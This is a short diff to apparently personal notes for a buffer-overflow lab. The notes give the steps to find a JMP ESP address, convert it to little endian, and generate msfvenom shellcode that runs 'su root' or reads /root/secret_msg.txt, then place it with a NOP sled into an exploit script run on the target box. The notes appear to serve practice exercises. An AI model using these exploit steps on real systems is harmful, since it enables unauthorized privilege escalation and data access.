@@ -26,7 +26,10 @@ DLL Hijacking on Dry Run issues
 - find /b 0xf7de1000,0xffffe000,0xff,0xe4
 - keep mind of first five addresses but take the first one and turn it to little endian. 0xf7defb59 --> \x59\xfb\xde\xf7
 -  in new linops term run your msfvenom command. 
+
 - msfvenom -p linux/x86/exec CMD="su root" -b "\x00\fe\x20\x0a\xff" -f python
+- msfvenom -p linux/x86/exec CMD="cat /root/secret_msg.txt" -b "\x00\fe\x20\x0a\xff" -f python
+
 - take this output and put it into your script
 - also set the nop in your script
 - now run your script with sudo in your target box.
